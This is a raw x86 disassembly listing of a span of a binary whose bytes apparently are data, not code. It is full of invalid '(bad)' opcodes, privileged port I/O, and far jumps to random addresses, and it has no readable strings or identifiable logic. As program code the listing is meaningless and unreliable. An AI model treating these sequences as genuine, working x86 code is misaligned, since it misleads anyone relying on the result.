  422e81:	loopne 0x422e3b
  422e83:	sbb    al,cl
  422e85:	loop   0x422ea0
  422e87:	rol    BYTE PTR [esi+ebp*8-0x11ebae93],1
  422e8e:	and    eax,0xcf52
	...
  422ef3:	add    BYTE PTR [ebx-0x21e677ab],al
  422ef9:	fst    QWORD PTR [ebx+0x33b808df]
  422eff:	retf   0x4c13
  422f02:	jbe    0x422f02
  422f04:	cld    
  422f05:	je     0x422f08
  422f07:	add    BYTE PTR ds:0xd7000001,al
  422f0d:	loopne 0x422efb
  422f0f:	inc    esp
  422f10:	ss dec esp
  422f12:	mov    ebx,0x97cb4642
  422f17:	add    BYTE PTR [edx+0x48cd68fc],al
  422f1d:	dec    ebx
  422f1e:	jnp    0x422f42
  422f20:	pop    es
  422f21:	inc    esp
  422f22:	mov    ds:0xfc7fa77a,al
  422f27:	dec    ebp
  422f28:	pop    ss
  422f29:	pop    ebp
  422f2a:	nop
  422f2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f2c:	std    
  422f2d:	sbb    eax,ebx
  422f2f:	sub    ebp,DWORD PTR [edi]
  422f31:	jmp    0x27d6:0xd9bd4b5d
  422f38:	je     0x422f5c
  422f3a:	adc    ebp,esi
  422f3c:	loope  0x422f87
  422f3e:	adc    dl,BYTE PTR [eax-0x58f80085]
  422f44:	fidivr WORD PTR [edx-0x2b329c5]
  422f4a:	loope  0x422f8e
  422f4c:	pusha  
  422f4d:	inc    esi
  422f4e:	xor    al,0x2b
  422f50:	nop
  422f51:	cmp    BYTE PTR [edi+esi*2],dh
  422f54:	out    0xaf,eax
  422f56:	mov    DWORD PTR [eax-0x3f93b0a],0xed543c0
  422f60:	inc    ebp
  422f61:	jp     0x422f50
  422f63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f64:	dec    edx
  422f65:	nop
  422f66:	stos   BYTE PTR es:[edi],al
  422f67:	xchg   ebx,eax
  422f68:	repnz sbb DWORD PTR [edi-0x1a],eax
  422f6c:	jmp    0x1c406c83
  422f71:	mov    esp,eax
  422f73:	scas   al,BYTE PTR es:[edi]
  422f74:	adc    DWORD PTR [esi+0x5],0xffffffd8
  422f78:	push   edx
  422f79:	dec    edx
  422f7a:	jns    0x422f2d
  422f7c:	dec    esp
  422f7d:	jo     0x422f5e
  422f7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f80:	sbb    al,0xa7
  422f82:	fsub   st(1),st
  422f84:	push   cs
  422f85:	adc    ebp,edx
  422f87:	imul   esp,ebx,0x489416db
  422f8d:	sub    ecx,DWORD PTR [edx-0x44]
  422f90:	cli    
  422f91:	cmc    
  422f92:	std    
  422f93:	aam    0x0
  422f95:	xchg   esi,eax
  422f96:	mov    esi,es
  422f98:	mov    edx,0xb7d1836c
  422f9d:	or     eax,0x82c6c41b
  422fa2:	clc    
  422fa3:	ins    DWORD PTR es:[edi],dx
  422fa4:	mov    es,WORD PTR [edi+0xbc299b5]
  422faa:	(bad)
  422fad:	imul   ebx,DWORD PTR [ebx-0x32e7908e],0xbcf7388a
  422fb7:	jno    0x423004
  422fb9:	adc    al,0x2a
  422fbb:	mov    edx,0x4a87cb50
  422fc0:	inc    ecx
  422fc1:	sub    DWORD PTR [eax-0x798faf7c],ecx
  422fc7:	dec    esp
  422fc8:	popa   
  422fc9:	pop    esp
  422fca:	aam    0x5d
  422fcc:	jl     0x42300d
  422fce:	fiadd  DWORD PTR [esi+0x28110d25]
  422fd4:	nop    DWORD PTR [eax]
  422fd7:	push   cs
  422fd8:	ins    BYTE PTR es:[edi],dx
  422fd9:	lea    ecx,[ebp-0x63d72a8d]
  422fdf:	ret    0x30e2
  422fe2:	cdq    
  422fe3:	adc    dh,BYTE PTR [eax+0x78e7e7c7]
  422fe9:	cmc    
  422fea:	inc    esp
  422feb:	rol    eax,cl
  422fed:	mov    WORD PTR [edx-0x1],cs
  422ff0:	ficomp DWORD PTR [eax+0x2e]
  422ff3:	jbe    0x42302b
  422ff5:	mov    al,ds:0x1fac89a8
  422ffa:	jae    0x422fd7
  422ffc:	cmp    BYTE PTR [esi-0x39718978],dh
  423002:	ins    BYTE PTR es:[edi],dx
  423003:	or     ebx,0xd0cbb46a
  423009:	or     eax,DWORD PTR [edi+edi*1-0x19]
  42300d:	lds    esi,FWORD PTR [ebx+0x63]
  423010:	fild   DWORD PTR [eax]
	...
  423072:	add    BYTE PTR [eax],al
  423074:	inc    esi
  423075:	in     al,0x62
  423077:	mov    dl,ah
  423079:	mov    gs,esi
  42307b:	out    dx,al
  42307c:	sub    ecx,ebx
  42307e:	sbb    DWORD PTR [ebp+ecx*8+0x119ac24],esp
  423085:	jbe    0x423088
  423087:	add    BYTE PTR ds:0x60000001,al
  42308d:	(bad)  
  42308e:	cs test al,0x8b
  423091:	jne    0x42301b
  423093:	fst    DWORD PTR [esp+edx*2+0x6405766e]
  42309a:	out    dx,eax
  42309b:	mov    DWORD PTR [ebx-0x54694d2d],eax
  4230a1:	jmp    0x29aaffea
  4230a6:	leave  
  4230a7:	shr    ecx,0x4
  4230aa:	sar    BYTE PTR [edx-0x208d530],1
  4230b0:	imul   esp,DWORD PTR [edx-0x22],0x7a
  4230b4:	leave  
  4230b5:	mov    edi,0x86cd0939
  4230ba:	sbb    BYTE PTR [edi+0x25],0x2
  4230be:	mov    bl,BYTE PTR ds:0x41006b43
  4230c4:	pop    edx
  4230c5:	and    edx,DWORD PTR [esi]
  4230c7:	in     eax,0xa
  4230c9:	into   
  4230ca:	push   ebx
  4230cb:	cmp    edi,DWORD PTR [esi]
  4230cd:	jg     0x4230ae
  4230cf:	(bad)  
  4230d0:	sti    
  4230d1:	imul   ebx,DWORD PTR [ebp+0x31dafe0f],0x1a
  4230d8:	cs test al,0x35
  4230db:	js     0x4230a7
  4230dd:	xchg   edx,eax
  4230de:	and    al,0x28
  4230e0:	dec    ebx
  4230e1:	mov    ebx,0x956723c
  4230e6:	stc    
  4230e7:	jne    0x423148
  4230e9:	add    BYTE PTR [eax-0x1d],bh
  4230ec:	leave  
  4230ed:	mov    al,0xaf
  4230ef:	mov    bl,ch
  4230f1:	(bad)  
  4230f2:	and    eax,0x7f20acd8
  4230f7:	pop    es
  4230f8:	add    al,0x3
  4230fa:	popf   
  4230fb:	cs adc eax,0x6952fbe9
  423101:	mov    bl,0x8
  423103:	jg     0x4230f0
  423105:	ins    DWORD PTR es:[edi],dx
  423106:	test   eax,0x34fdf625
  42310b:	loopne 0x4230ba
  42310d:	out    0x18,eax
  42310f:	jne    0x423144
  423111:	int3   
  423112:	jb     0x423158
  423114:	pop    eax
  423115:	test   al,0x4d
  423117:	js     0x42317b
  423119:	dec    ebp
  42311a:	pop    ds
  42311b:	adc    ah,BYTE PTR [edi+ebx*2-0x3347987f]
  423122:	stos   BYTE PTR es:[edi],al
  423123:	mov    ax,ds:0xc24e7c56
  423129:	imul   DWORD PTR ds:0x812482a9
  42312f:	call   DWORD PTR [ebx]
  423132:	sub    cl,BYTE PTR [ecx]
  423134:	mov    dl,BYTE PTR [edi]
  423136:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423137:	test   BYTE PTR [esi+0x5d6ce5a],dh
  42313d:	stc    
  42313e:	mov    al,dl
  423140:	jns    0x4231b4
  423142:	in     al,0xab
  423144:	fstp   QWORD PTR [ecx]
  423146:	pop    edi
  423147:	pop    ebp
  423148:	sub    al,0xdf
  42314a:	imul   edx,DWORD PTR [eax-0x4b],0x14da701c
  423151:	dec    edx
  423152:	mov    es,WORD PTR [ecx-0x55]
  423155:	not    BYTE PTR [ecx]
  423157:	jl     0x42317b
  423159:	push   edx
  42315a:	xchg   DWORD PTR [ecx],eax
  42315c:	sub    ah,0x50
  42315f:	or     edi,DWORD PTR [eax]
  423161:	jno    0x423106
  423163:	lods   al,BYTE PTR ds:[esi]
  423164:	fiadd  WORD PTR [eax]
  423166:	adc    eax,0x89e9c54a
  42316b:	pop    edi
  42316c:	inc    sp
  42316e:	test   BYTE PTR [edi+0x4eb63cb1],bh
  423174:	and    eax,0x569b828
  423179:	jo     0x42313d
  42317b:	xchg   ebp,eax
  42317c:	shl    BYTE PTR [edx-0x7],cl
  42317f:	rcl    bh,cl
  423181:	jle    0x4231bb
  423183:	add    al,0x1f
  423185:	fwait
  423186:	and    esp,DWORD PTR [ecx]
  423188:	dec    eax
  423189:	inc    esp
  42318a:	lods   eax,DWORD PTR ds:[esi]
  42318b:	mov    eax,ebp
  42318d:	arpl   WORD PTR [ebx+0x1a],bp
  423190:	mov    al,ds:0x0
	...
  4231f1:	add    BYTE PTR [eax],al
  4231f3:	add    BYTE PTR [ecx-0xf],bh
  4231f6:	div    DWORD PTR [ecx-0x6804801]
  4231fc:	in     al,0xe0
  4231fe:	sub    DWORD PTR [edx-0x5f87bd03],esp
  423204:	push   es
  423205:	ja     0x423208
  423207:	add    BYTE PTR ds:0x3c000001,al
  42320d:	popa   
  42320e:	sub    dh,BYTE PTR [ebx]
  423210:	pop    ss
  423211:	dec    ebp
  423212:	les    esi,FWORD PTR [esi]
  423214:	mov    edi,0xaacce315
  423219:	sbb    eax,0x5151f83
  42321e:	xchg   esp,eax
  42321f:	inc    esp
  423220:	jle    0x423270
  423222:	or     DWORD PTR [edx],edi
  423224:	test   eax,0x2cfa493b
  423229:	or     al,0x89
  42322b:	cmp    edx,esi
  42322d:	nop
  42322e:	dec    edx
  42322f:	fstp   st(7)
  423231:	shr    BYTE PTR [ecx-0x68],0xf0
  423235:	arpl   WORD PTR [ecx-0x55],sp
  423238:	arpl   WORD PTR [ebx],cx
  42323a:	aas    
  42323b:	xchg   esi,eax
  42323c:	repnz arpl dx,di
  42323f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423240:	jle    0x42327d
  423242:	lahf   
  423243:	cmp    BYTE PTR [ecx+0x23],bl
  423246:	add    eax,0xa7f1fa96
  42324b:	loope  0x4231d2
  42324d:	lods   al,BYTE PTR ds:[esi]
  42324e:	loop   0x423265
  423250:	lahf   
  423251:	data16 loope 0x4232b0
  423254:	push   ecx
  423255:	push   edi
  423256:	das    
  423257:	int3   
  423258:	mov    eax,0x9ed5142f
  42325d:	push   cs
  42325e:	or     esp,DWORD PTR [edx+0x63]
  423261:	mov    ah,0xba
  423263:	add    BYTE PTR ds:[edi+0x48da35a8],al
  42326a:	push   esi
  42326b:	push   0x94adf11f
  423270:	adc    eax,0x5bba0f79
  423275:	mov    DWORD PTR [ebx-0x64],ecx
  423278:	sahf   
  423279:	(bad)  
  42327a:	iret   
  42327b:	addr16 xchg ecx,eax
  42327d:	imul   esp,ecx,0x1b108fdf
  423283:	pop    esi
  423284:	mov    ds:0x1bf79f5,al
  423289:	xor    ch,BYTE PTR [ebx]
  42328b:	or     eax,0x11c02e24
  423290:	fsubr  DWORD PTR [ebp+edx*1-0x3]
  423294:	adc    eax,0x2ffd5313
  423299:	(bad)  
  42329a:	or     al,0x42
  42329c:	out    dx,al
  42329d:	in     eax,0xfc
  42329f:	dec    edi
  4232a0:	lods   eax,DWORD PTR ds:[esi]
  4232a1:	or     ecx,edx
  4232a3:	sbb    esi,DWORD PTR [ecx-0x7075e441]
  4232a9:	xor    BYTE PTR [ecx],bl
  4232ab:	sahf   
  4232ac:	dec    ecx
  4232ad:	inc    edx
  4232ae:	jecxz  0x4232c3
  4232b0:	mov    ds:0xb6b5f15f,eax
  4232b5:	add    al,0xce
  4232b7:	jbe    0xa3db83ed
  4232bd:	repz int 0xf0
  4232c0:	push   0xf8b96739
  4232c5:	shl    al,0x5b
  4232c8:	pop    ecx
  4232c9:	ins    BYTE PTR es:[edi],dx
  4232ca:	sub    DWORD PTR [edx+0x46418a7a],ecx
  4232d0:	dec    ebx
  4232d1:	cli    
  4232d2:	adc    ah,BYTE PTR [edi]
  4232d4:	or     BYTE PTR [edx+0x74],0xb7
  4232d8:	adc    DWORD PTR [eax+0x44f123e6],ebp
  4232de:	add    eax,DWORD PTR [edi-0x2c]
  4232e1:	(bad)  
  4232e2:	arpl   WORD PTR [eax],sp
  4232e4:	add    ebx,DWORD PTR [esi-0x5168cb5d]
  4232ea:	aam    0x9d
  4232ec:	mov    eax,0xcac0c2f7
  4232f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4232f2:	cmp    al,BYTE PTR [eax+eax*2]
  4232f5:	xchg   esp,eax
  4232f6:	push   edx
  4232f7:	push   ecx
  4232f8:	mov    ah,0x5b
  4232fa:	inc    ebp
  4232fb:	xor    al,0x19
  4232fd:	retf   0x36af
  423300:	and    DWORD PTR ds:0xc84f49e7,esi
  423306:	sub    DWORD PTR [ecx-0x2c],edx
  423309:	jg     0x423353
  42330b:	sar    bh,cl
  42330d:	lds    ecx,FWORD PTR [edi]
  42330f:	jecxz  0x4232bc
	...
  423371:	add    BYTE PTR [eax],al
  423373:	add    al,bh
  423375:	fisub  WORD PTR [edx+0x30]
  423378:	mov    sp,0xdefa
  42337c:	mov    eax,fs:0xb2190f44
  423382:	mov    ch,0x74
  423384:	or     edi,DWORD PTR [eax+0x1]
  423387:	add    BYTE PTR ds:0xc7000001,al
  42338d:	mov    ecx,DWORD PTR [edx]
  42338f:	dec    edi
  423390:	daa    
  423391:	je     0x4233be
  423393:	cmp    ch,ah
  423395:	push   0x2e
  423397:	imul   ebp,esp,0xffffffb1
  42339a:	cmp    eax,0xdad3967
  42339f:	fnstsw WORD PTR [ebx-0x49]
  4233a2:	mov    edi,0x26c6ad43
  4233a7:	jno    0x423412
  4233a9:	sar    BYTE PTR ds:0x4c80bf4b,cl
  4233af:	sbb    eax,0xe913a332
  4233b4:	aam    0xd9
  4233b6:	sub    bh,BYTE PTR ds:0xdeb601a1
  4233bc:	imul   esi,ecx,0xd158439f
  4233c2:	pop    es
  4233c3:	dec    esp
  4233c4:	popa   
  4233c5:	ja     0x423355
  4233c7:	(bad)  
  4233c8:	enter  0x2b09,0x45
  4233cc:	daa    
  4233cd:	(bad)  
  4233cf:	frstor [ebx+0x4dd1752b]
  4233d5:	(bad)  
  4233d6:	xor    dh,BYTE PTR [ecx]
  4233d8:	stos   DWORD PTR es:[edi],eax
  4233d9:	mov    ebx,0xa3d54246
  4233de:	fwait
  4233df:	push   0x62f5c25b
  4233e4:	inc    eax
  4233e5:	and    al,0xa0
  4233e7:	sbb    DWORD PTR [eax],ebx
  4233e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4233ea:	cmp    eax,0xe4eaed85
  4233ef:	sti    
  4233f0:	mov    al,0xba
  4233f2:	sbb    eax,0xc2045afc
  4233f7:	add    al,0x2d
  4233f9:	imul   ecx,DWORD PTR [edi+0x3a],0x22a1b503
  423400:	jne    0x42338f
  423402:	test   eax,0xd575bccf
  423407:	nop
  423408:	fdiv   st,st(0)
  42340a:	jl     0x423471
  42340c:	in     al,0x3e
  42340e:	sti    
  42340f:	inc    ebp
  423410:	add    bl,BYTE PTR [ecx+0x14dadfac]
  423416:	stos   DWORD PTR es:[edi],eax
  423417:	xchg   ebx,eax
  423418:	inc    BYTE PTR [ebx-0x4f]
  42341b:	shr    esp,cl
  42341d:	mov    ecx,DWORD PTR [ebx-0x7b]
  423420:	nop
  423421:	adc    BYTE PTR [ebx-0x8],al
  423424:	adc    edi,ecx
  423426:	dec    eax
  423427:	leave  
  423428:	sbb    al,0x92
  42342a:	and    al,0x6f
  42342c:	push   ebp
  42342d:	or     DWORD PTR [ebp+0x27],0xffffff95
  423431:	scas   al,BYTE PTR es:[edi]
  423432:	cmp    cl,0x45
  423435:	and    edx,ecx
  423437:	push   0x3a1a5478
  42343c:	rcl    BYTE PTR [ebx],1
  42343e:	xchg   ebx,eax
  42343f:	ins    DWORD PTR es:[edi],dx
  423440:	mov    cs,WORD PTR [edx-0x6]
  423443:	pop    esi
  423444:	pusha  
  423445:	rol    DWORD PTR [eax-0x689a513d],1
  42344b:	clc    
  42344c:	inc    ebx
  42344d:	fdiv   DWORD PTR [esp+eax*1+0x3d]
  423451:	xor    BYTE PTR [edx+0x601d5ed4],bl
  423457:	sub    bh,BYTE PTR [edx]
  423459:	xor    BYTE PTR [ebx+ebp*2+0x40d0dc3e],ah
  423460:	iret   
  423461:	cmp    eax,0x53917856
  423466:	cmp    BYTE PTR [edx],ch
  423468:	out    dx,al
  423469:	mov    esp,0x74bc865d
  42346e:	repz ret 
  423470:	lods   eax,DWORD PTR ds:[esi]
  423471:	jmp    0x72cd:0xa80b6d19
  423478:	cld    
  423479:	sbb    eax,DWORD PTR [esp+ecx*1+0x63]
  42347d:	fdiv   DWORD PTR [esi-0x3de0f7d2]
  423483:	cmp    cl,BYTE PTR [edi-0x6c]
  423486:	jo     0x42344e
  423488:	loop   0x423493
  42348a:	dec    edi
  42348b:	xchg   DWORD PTR [esi],eax
  42348d:	daa    
  42348e:	(bad)  
  42348f:	in     al,0x2a
	...
  4234f1:	add    BYTE PTR [eax],al
  4234f3:	add    al,al
  4234f5:	mov    al,0x45
  4234f7:	outs   dx,DWORD PTR ds:[esi]
  4234f8:	jne    0x4234f9
  4234fa:	jmp    0xa11f:0xadf467bf
  423501:	mov    eax,ds:0x79104fe4
  423506:	add    DWORD PTR [eax],eax
  423508:	add    eax,0x1a000001
  42350d:	lea    edx,[esi]
  42350f:	ins    DWORD PTR es:[edi],dx
  423510:	stos   DWORD PTR es:[edi],eax
  423511:	call   0xf96e781c
  423516:	fist   DWORD PTR [ecx]
  423518:	add    al,0xa2
  42351a:	push   ebx
  42351b:	iret   
  42351c:	gs mov dl,0xd6
  42351f:	sbb    al,BYTE PTR [ebp-0x70]
  423522:	mov    DWORD PTR [ecx+edx*8+0x70],ecx
  423526:	xchg   esi,eax
  423527:	pavgb  mm0,QWORD PTR [edx]
  42352a:	jb     0x4235a9
  42352c:	popa   
  42352d:	lahf   
  42352e:	test   al,0x5f
  423530:	(bad)  
  423531:	cs ins DWORD PTR es:[edi],dx
  423533:	nop
  423534:	dec    esi
  423535:	mov    dh,0xb
  423537:	ss loope 0x42355f
  42353a:	lods   eax,DWORD PTR ds:[esi]
  42353b:	or     ebx,esp
  42353d:	mov    dl,0x7d
  42353f:	jp     0x423509
  423541:	jl     0x42351a
  423543:	mov    ebp,0x4f093f99
  423548:	test   al,0xc6
  42354a:	sub    eax,0x5a8e3192
  42354f:	fimul  WORD PTR [ecx+0x24f8f868]
  423555:	repnz xor ah,BYTE PTR [eax]
  423558:	fist   DWORD PTR [edi-0x5e]
  42355b:	int3   
  42355c:	xchg   ecx,eax
  42355d:	jmp    0x423527
  42355f:	push   0xbd1856c7
  423564:	imul   esp,ecx,0x80a39ecf
  42356a:	mov    ebp,0xff7c00c3
  42356f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423570:	xlat   BYTE PTR ds:[ebx]
  423571:	pop    esi
  423572:	mov    eax,0x275495bf
  423577:	pop    ss
  423578:	in     eax,dx
  423579:	and    cl,BYTE PTR [esi+0xd0ce0f7]
  42357f:	fnstenv [eax-0x4b44fa43]
  423585:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423586:	out    dx,eax
  423587:	loope  0x42353b
  423589:	xlat   BYTE PTR ds:[ebx]
  42358a:	push   ecx
  42358b:	xchg   DWORD PTR [esi+ebx*1+0xf],edi
  42358f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423590:	in     al,dx
  423591:	aam    0xaa
  423593:	xlat   BYTE PTR ds:[ebx]
  423594:	aaa    
  423595:	neg    DWORD PTR [ebx+0x44]
  423598:	push   ss
  423599:	and    al,0xc
  42359b:	stos   BYTE PTR es:[edi],al
  42359c:	xchg   edx,eax
  42359d:	ret    
  42359e:	neg    DWORD PTR [esi]
  4235a0:	aad    0x97
  4235a2:	(bad)  
  4235a4:	cdq    
  4235a5:	fimul  WORD PTR [edx+0x51a3245e]
  4235ab:	(bad)  
  4235ac:	jge    0x4235c3
  4235ae:	(bad)
  4235b3:	add    edi,edx
  4235b5:	jnp    0x42361e
  4235b7:	out    dx,eax
  4235b8:	fbstp  TBYTE PTR [esi+edi*8]
  4235bb:	call   0xb5c:0xddcc6ebc
  4235c2:	xchg   DWORD PTR [ecx-0x43],eax
  4235c5:	addr16 iret 
  4235c7:	(bad)  
  4235c9:	ror    BYTE PTR [edx-0x31],0x46
  4235cd:	ret    0x7814
  4235d0:	push   0x6ac0f0e
  4235d5:	adc    dh,cl
  4235d7:	push   ss
  4235d8:	inc    esi
  4235d9:	iret   
  4235da:	sbb    eax,DWORD PTR [edx+0x72163db8]
  4235e0:	jmp    0xb8295e05
  4235e5:	enter  0x86b,0xbc
  4235e9:	mov    cs,WORD PTR [ecx]
  4235eb:	ja     0x423575
  4235ed:	add    BYTE PTR [eax],ah
  4235ef:	clc    
  4235f0:	stos   DWORD PTR es:[edi],eax
  4235f1:	dec    ebp
  4235f2:	sub    DWORD PTR [ecx-0x1487dd5e],edx
  4235f8:	dec    ecx
  4235f9:	push   edi
  4235fa:	pop    ecx
  4235fb:	mov    eax,0x8c3ae7f5
  423600:	int3   
  423601:	adc    eax,edx
  423603:	inc    DWORD PTR [edi-0x4c4923d8]
  423609:	popf   
  42360a:	dec    esp
  42360b:	xchg   edx,eax
  42360c:	pcmpgtd mm7,mm5
  42360f:	stos   DWORD PTR es:[edi],eax
  423610:	xor    eax,DWORD PTR [eax]
	...
  423672:	add    BYTE PTR [eax],al
  423674:	or     BYTE PTR [edi-0x8808b84],0x88
  42367b:	jmp    FWORD PTR [esi-0x6f]
  42367e:	jl     0x423693
  423680:	ins    DWORD PTR es:[edi],dx
  423681:	hlt    
  423682:	and    edx,DWORD PTR cs:0x500017a
  423689:	add    DWORD PTR [eax],eax
  42368b:	add    BYTE PTR [ebx],ch
  42368d:	fs call 0xbb34:0x85c5c604
  423695:	(bad)  
  423696:	aam    0xe0
  423698:	mov    ecx,0xbb73e438
  42369d:	xor    al,BYTE PTR [ebp-0x5f]
  4236a0:	leave  
  4236a1:	inc    ecx
  4236a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4236a3:	or     eax,0xa5ac83c6
  4236a8:	xor    edx,DWORD PTR [eax-0x7d6c35d1]
  4236ae:	xchg   DWORD PTR [esi-0x3a],eax
  4236b1:	adc    al,0x86
  4236b3:	sub    esp,DWORD PTR [ecx-0x13]
  4236b6:	int    0xb0
  4236b8:	imul   esp,DWORD PTR [eax+0x14922ba],0x61
  4236bf:	mov    edi,0xa7e8154
  4236c4:	sbb    ch,ah
  4236c6:	pop    esp
  4236c7:	fldenv ds:0xaae1be5c
  4236cd:	dec    edx
  4236ce:	int    0x3e
  4236d0:	jle    0x423725
  4236d2:	adc    ebp,DWORD PTR [eax+0x41]
  4236d5:	xchg   ebp,eax
  4236d6:	and    edx,DWORD PTR [ebp-0x3eda2392]
  4236dc:	adc    esi,DWORD PTR [edi+eax*8+0x11]
  4236e0:	adc    DWORD PTR [ebx],edi
  4236e2:	push   0xffffff99
  4236e4:	push   ebx
  4236e5:	push   esi
  4236e6:	aam    0xdf
  4236e8:	cmp    BYTE PTR [ecx+0x2fd08dea],dl
  4236ee:	jge    0x423707
  4236f0:	aaa    
  4236f1:	dec    ebp
  4236f2:	mov    esi,0xd9818d0a
  4236f7:	ja     0x423735
  4236f9:	add    DWORD PTR [eax],edi
  4236fb:	push   esi
  4236fc:	iret   
  4236fd:	call   DWORD PTR [bx]
  423700:	and    al,0x91
  423702:	test   DWORD PTR [eax+0x73],esp
  423705:	jb     0x423709
  423707:	mov    ds:0x60749dee,al
  42370c:	sub    dl,BYTE PTR [ecx]
  42370e:	fsub   DWORD PTR [ebp-0x2ca0b027]
  423714:	push   ecx
  423715:	out    dx,eax
  423716:	rcr    edi,cl
  423718:	mul    DWORD PTR cs:[esi+0x757b7b8d]
  42371f:	pusha  
  423720:	shl    DWORD PTR [esp+edi*1],1
  423723:	ret    0x8eb8
  423726:	xor    DWORD PTR [eax-0x32],0x8b262ec5
  42372d:	mov    edi,0x91fd9c9c
  423732:	lahf   
  423733:	ds jbe 0x42376e
  423736:	jg     0x4236cb
  423738:	mov    ebx,0x96631753
  42373d:	jmp    0x56ca9015
  423742:	inc    ecx
  423743:	aaa    
  423744:	lock mov ax,ds:0x4a981ecb
  42374b:	push   edx
  42374c:	mov    bh,0x6a
  42374e:	xchg   esp,eax
  42374f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423750:	xchg   esp,eax
  423751:	mov    esi,0x2c562d50
  423756:	mov    gs,WORD PTR [edi]
  423758:	scas   eax,DWORD PTR es:[edi]
  423759:	and    BYTE PTR [eax+0x64],dh
  42375c:	sbb    DWORD PTR [edx+0x46],ebp
  42375f:	fwait
  423760:	dec    esp
  423761:	jecxz  0x4236eb
  423763:	pop    es
  423764:	xor    eax,0x51d3d27a
  423769:	push   ecx
  42376a:	cmp    DWORD PTR [esi],eax
  42376c:	sahf   
  42376d:	ret    0xd62
  423770:	dec    esp
  423771:	add    cl,cl
  423773:	lods   eax,DWORD PTR ds:[esi]
  423774:	push   edi
  423775:	jecxz  0x423734
  423777:	xchg   edi,eax
  423778:	sbb    ebp,DWORD PTR [edx+0x2f1c1c3e]
  42377e:	ret    
  42377f:	inc    edx
  423780:	shr    DWORD PTR [ebx-0xf],0xa3
  423784:	ret    
  423785:	pop    esp
  423786:	shl    DWORD PTR [esi-0x60],cl
  423789:	dec    ebp
  42378a:	mov    ecx,DWORD PTR [edx+0xcb53579]
  423790:	sbb    eax,0x0
	...
  4237f1:	add    BYTE PTR [eax],al
  4237f3:	add    BYTE PTR [ebx+eiz*1],dh
  4237f6:	jo     0x423795
  4237f8:	ja     0x4237d9
  4237fa:	std    
  4237fb:	stos   DWORD PTR es:[edi],eax
  4237fc:	(bad)  
  4237fd:	sbb    edx,esi
  4237ff:	jmp    0x7b1a:0x2c0d6f82
  423806:	add    DWORD PTR [eax],eax
  423808:	add    eax,0xa8000001
  42380d:	test   BYTE PTR [ecx+edi*1],0xca
  423811:	xlat   BYTE PTR ds:[ebx]
  423812:	sti    
  423813:	scas   eax,DWORD PTR es:[edi]
  423814:	jp     0x423827
  423816:	or     ecx,DWORD PTR [eax-0x27ff1b56]
  42381c:	ja     0x423837
  42381e:	leave  
  42381f:	pop    ebx
  423820:	dec    ecx
  423821:	jmp    0x8b536de6
  423826:	mov    ch,0xd6
  423828:	mov    eax,ss
  42382a:	ror    BYTE PTR [ecx+0xbbc6744],1
  423830:	jmp    0x423837
  423832:	xlat   BYTE PTR ds:[ebx]
  423833:	cmp    al,0xfa
  423835:	or     eax,0x994f2602
  42383a:	aaa    
  42383b:	mov    ds:0x953d570a,al
  423840:	leave  
  423841:	in     eax,dx
  423842:	jne    0x4237cb
  423844:	add    al,bh
  423846:	push   edi
  423847:	sbb    esi,DWORD PTR [eax+0x1690a357]
  42384d:	sbb    DWORD PTR [eax-0x4d98b125],esi
  423853:	je     0x4237ed
  423855:	dec    edx
  423856:	imul   ebp,ebp,0xe6cbe816
  42385c:	push   ebx
  42385d:	clc    
  42385e:	mov    bh,0x5d
  423860:	neg    BYTE PTR [edx-0x2844f86e]
  423866:	dec    ebp
  423867:	sub    ebp,0xd5ed6f3c
  42386d:	mov    dh,0x31
  42386f:	je     0x42389e
  423871:	popf   
  423872:	jp     0x4238a3
  423874:	sahf   
  423875:	test   BYTE PTR [ebx+ebp*4+0x717aab2e],dl
  42387c:	or     eax,DWORD PTR [ebp-0xea3a925]
  423882:	stc    
  423883:	retf   0xeb86
  423886:	push   ecx
  423887:	lods   al,BYTE PTR ds:[esi]
  423888:	xor    eax,0xaed38529
  42388d:	out    dx,al
  42388e:	out    0x2d,eax
  423890:	jne    0x4238c6
  423892:	add    eax,0x6846a7f3
  423897:	ss repz popa 
  42389a:	sbb    al,0x6e
  42389c:	shr    BYTE PTR [edi],cl
  42389e:	xor    eax,0x220d6c53
  4238a3:	add    eax,0xe31403b4
  4238a8:	xor    ebx,edx
  4238aa:	push   0x6895ab6a
  4238af:	mov    al,0xfb
  4238b1:	xchg   esi,eax
  4238b2:	or     eax,0xe468f8f9
  4238b7:	stos   DWORD PTR es:[edi],eax
  4238b8:	add    eax,0x11bce7db
  4238bd:	(bad)  
  4238be:	cmp    DWORD PTR [eax+0x3c5962f6],edi
  4238c4:	fadd   QWORD PTR [ecx+esi*8-0x710065c9]
  4238cb:	and    esp,DWORD PTR [ecx]
  4238cd:	jmp    0xf0f9a12b
  4238d2:	std    
  4238d3:	das    
  4238d4:	adc    DWORD PTR [ebx-0x18],eax
  4238d7:	inc    esi
  4238d8:	fwait
  4238d9:	and    DWORD PTR [edi+0x37],0x1f
  4238dd:	enter  0x8526,0xf2
  4238e1:	jne    0x42394c
  4238e3:	mov    ch,0xe7
  4238e5:	test   DWORD PTR [edi-0x20],0x2ff93c59
  4238ec:	xchg   edi,eax
  4238ed:	call   0xd69e93ed
  4238f2:	add    BYTE PTR [ebp-0x318d308e],0x29
  4238f9:	inc    edi
  4238fa:	imul   esi,DWORD PTR [edx],0x4b
  4238fd:	stos   BYTE PTR es:[edi],al
  4238fe:	icebp  
  4238ff:	lea    edx,[ecx+0x75]
  423902:	and    DWORD PTR [esi-0x19cd27b7],edi
  423908:	inc    esi
  423909:	dec    ecx
  42390a:	out    dx,eax
  42390b:	mov    ah,0xf0
  42390d:	rcr    DWORD PTR [ebx+ebx*2],1
  423910:	test   DWORD PTR [eax],0x0
	...
  423972:	add    BYTE PTR [eax],al
  423974:	mov    ah,BYTE PTR [ecx+esi*8-0x4220078]
  42397b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42397c:	push   ecx
  42397d:	sbb    eax,0x84be2bbd
  423982:	xchg   DWORD PTR [ecx+0x1f],edx
